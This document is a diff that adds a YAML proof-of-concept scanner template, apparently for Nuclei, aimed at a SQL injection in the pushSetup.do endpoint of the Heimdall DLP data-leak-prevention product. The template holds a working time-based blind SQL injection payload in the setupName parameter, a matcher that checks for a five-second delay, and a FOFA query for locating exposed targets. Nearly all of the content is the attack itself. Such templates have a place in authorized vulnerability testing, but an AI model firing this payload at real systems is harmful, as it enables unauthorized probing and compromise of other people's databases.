@@ -1,0 +1,40 @@
+id: poc-dggngfwz0n4f0n8y
+info:
+  name: 虹安Heimdall DLP数据泄漏防护系统 pushSetup.do SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dggngfwz0n4f0n8y
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dggngfwz0n4f0n8y
+    fofa: body="userReg/initUserReg.do"
+http:
+- raw:
+  - 'POST /dlp/userReg/pushSetup.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Priority: u=4
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    setupName={{urlescape(1'' AND (SELECT 6789 FROM (SELECT(SLEEP(5)))nxdq) AND ''vpUG''=''vpUG)}}'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
